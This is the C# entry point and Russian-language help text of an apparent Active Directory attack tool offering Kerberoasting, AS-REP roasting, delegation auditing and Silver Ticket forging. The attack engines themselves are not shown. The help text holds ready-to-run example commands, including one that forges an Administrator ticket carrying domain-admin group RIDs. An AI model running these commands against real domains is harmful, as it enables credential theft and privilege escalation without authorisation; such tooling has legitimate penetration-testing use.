using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using Kerberos.NET.Crypto;

namespace krbengine
{
    class Program
    {
        static async Task Main(string[] args)
        {
            // Инициализация кроссплатформенной криптографии
            InitCryptoPalSafe();
            
            // Проверка базовых аргументов
            if (args.Length == 0 || args[0] == "-h" || args[0] == "--help")
            {
                PrintGlobalHelp();
                return;
            }

            string module = args[0].ToLower();
            if (args.Length == 1 || (args.Length > 1 && (args[1] == "-h" || args[1] == "--help")))
            {
                PrintModuleHelp(module);
                return;
            }

            // Парсинг аргументов командной строки в словарь
            var options = ParseArguments(args);
            try 
            {
                switch (module)
                {
                    case "kerberoast":
                        if (!ValidateOptions(options, "-dc-ip", "-d", "-u")) return;
                        await KerberoastEngine.RunAsync(options);
                        break;
                    case "asreproast":
                        if (!ValidateOptions(options, "-dc-ip", "-d")) return;
                        await AsRepRoastEngine.RunAsync(options);
                        break;
                    case "delegation":
                        if (!ValidateOptions(options, "-dc-ip", "-d", "-u")) return;
                        DelegationEngine.Run(options);
                        break;
                    case "forge":
                        if (!ValidateOptions(options, "-d", "-u", "-spn", "-sid", "-hash")) return;
                        await TicketForgeEngine.RunAsync(options); 
                        break;

                    default:
                        PrintError($"Неизвестный модуль: '{module}'");
                        break;
                }
            }
            catch (Exception ex)
            {
                PrintError($"Критический сбой в работе модуля {module}: {ex.Message}");
            }
        }

        // Разбор аргументов командной строки в словарь
        static Dictionary<string, string> ParseArguments(string[] args)
        {
            var dict = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            for (int i = 1; i < args.Length; i++)
            {
                if (args[i].StartsWith("-") && i + 1 < args.Length && !args[i + 1].StartsWith("-"))
                {
                    dict[args[i].ToLower()] = args[i + 1];
                    i++; 
                }
                else if (args[i].StartsWith("-"))
                {
                    if (args[i].ToLower() == "-u") 
                        dict[args[i].ToLower()] = "anonymous";
                    else
                        dict[args[i].ToLower()] = "true";
                }
            }
            return dict;
        }

        // Проверка наличия обязательных параметров перед запуском модуля
        static bool ValidateOptions(Dictionary<string, string> options, params string[] requiredFlags)
        {
            foreach (var flag in requiredFlags)
            {
                if (!options.ContainsKey(flag))
                {
                    PrintError($"Пропущен обязательный параметр: {flag}");
                    return false;
                }
            }
            return true;
        }

        // Инициализация криптографического провайдера
        static void InitCryptoPalSafe()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) 
            {
                CryptoPal.RegisterPal(() => new CustomLinuxCryptoPal()); 
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                CryptoPal.RegisterPal(() => new CustomWindowsCryptoPal()); 
            }
        }

        // Вывод общей справки по доступным модулям
        static void PrintGlobalHelp()
        {
            Console.WriteLine("Использование: krbengine.exe <модуль> [параметры]\n");

            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine("ДОСТУПНЫЕ МОДУЛИ:");
            Console.ResetColor();

            Console.WriteLine("  kerberoast    Поиск SPN и получение TGS-билетов");
            Console.WriteLine("  asreproast    Поиск учетных записей без Kerberos-преаутентификации");
            Console.WriteLine("  delegation    Аудит настроек делегирования в Active Directory");
            Console.WriteLine("  forge         Формирование Silver Ticket\n");

            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("Подсказка: krbengine.exe <модуль> -h");
            Console.ResetColor();
        }

        // Вывод справки по параметрам выбранного модуля
        static void PrintModuleHelp(string module)
        {
            Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"МОДУЛЬ: {module.ToUpper()}");
            Console.ResetColor();

            switch (module.ToLowerInvariant())
            {
                case "kerberoast":
                    Console.WriteLine("Описание: поиск учетных записей с SPN и получение TGS-билетов для последующего оффлайн-аудита паролей.\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("ОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -dc-ip <IP>              IP-адрес контроллера домена");
                    Console.WriteLine("  -d     <Domain>          FQDN домена, например CORP.LOCAL");
                    Console.WriteLine("  -u     <user:password>   учетные данные для LDAP/Kerberos-запросов\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("НЕОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -spn   <SPN>             точечная проверка конкретного SPN\n");

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("Пример:");
                    Console.WriteLine("  krbengine.exe kerberoast -dc-ip 192.168.50.20 -d CORP.LOCAL -u thomas.martin:Password123!");
                    Console.ResetColor();
                    break;

                case "asreproast":
                    Console.WriteLine("Описание: поиск пользователей с отключенной Kerberos-преаутентификацией и получение AS-REP.\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("ОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -dc-ip <IP>              IP-адрес контроллера домена");
                    Console.WriteLine("  -d     <Domain>          FQDN домена, например CORP.LOCAL\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("НЕОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -u     <User>            пользователь для LDAP-разведки");
                    Console.WriteLine("  -p     <Password>        пароль пользователя для LDAP-разведки");
                    Console.WriteLine("  -tu    <User>            точечная проверка конкретной учетной записи\n");

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("Пример:");
                    Console.WriteLine("  krbengine.exe asreproast -dc-ip 192.168.50.20 -d CORP.LOCAL -u thomas.martin -p Password123!");
                    Console.WriteLine("  krbengine.exe asreproast -dc-ip 192.168.50.20 -d CORP.LOCAL -tu robert.davis");
                    Console.ResetColor();
                    break;

                case "delegation":
                    Console.WriteLine("Описание: аудит настроек делегирования в Active Directory через LDAP-атрибуты.\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("ОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -dc-ip <IP>              IP-адрес контроллера домена");
                    Console.WriteLine("  -d     <Domain>          FQDN домена, например CORP.LOCAL");
                    Console.WriteLine("  -u     <User>            пользователь для LDAP-запроса");
                    Console.WriteLine("  -p     <Password>        пароль пользователя\n");

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("Пример:");
                    Console.WriteLine("  krbengine.exe delegation -dc-ip 192.168.50.20 -d CORP.LOCAL -u thomas.martin -p Password123!");
                    Console.ResetColor();
                    break;

                case "forge":
                    Console.WriteLine("Описание: локальное формирование Silver Ticket для выбранного сервисного SPN.\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("ОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -d       <Domain>        FQDN домена, например CORP.LOCAL");
                    Console.WriteLine("  -u       <User>          имя пользователя, помещаемое в билет");
                    Console.WriteLine("  -spn     <SPN>           целевой SPN, например cifs/server.corp.local");
                    Console.WriteLine("  -sid     <SID>           SID домена без RID пользователя");
                    Console.WriteLine("  -hash    <Key>           NTLM или AES256 ключ сервисной учетной записи\n");

                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("НЕОБЯЗАТЕЛЬНЫЕ ПАРАМЕТРЫ:");
                    Console.ResetColor();
                    Console.WriteLine("  -rid     <RID>           RID пользователя, по умолчанию 500");
                    Console.WriteLine("  -kvno    <Number>        версия ключа сервисной учетной записи");
                    Console.WriteLine("  -primary <RID>           основная группа, по умолчанию 513");
                    Console.WriteLine("  -groups  <RID,RID>       список RID групп через запятую");
                    Console.WriteLine("  -out     <File>          имя выходного .kirbi файла\n");

                    Console.ForegroundColor = ConsoleColor.DarkGray;
                    Console.WriteLine("Пример:");
                    Console.WriteLine("  krbengine.exe forge -d CORP.LOCAL -u Administrator -sid S-1-5-21-... -rid 500 -hash <key> -spn cifs/server.corp.local -kvno 4 -groups 513,512,519 -out admin.kirbi");
                    Console.ResetColor();
                    break;

                default:
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Неизвестный модуль.");
                    Console.ResetColor();

                    Console.WriteLine("\nДоступные модули:");
                    Console.WriteLine("  kerberoast");
                    Console.WriteLine("  asreproast");
                    Console.WriteLine("  delegation");
                    Console.WriteLine("  forge");
                    break;
            }

            Console.WriteLine();
        }

        static void PrintError(string message)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[!] ОШИБКА: {message}");
            Console.ResetColor();
        }
    }
}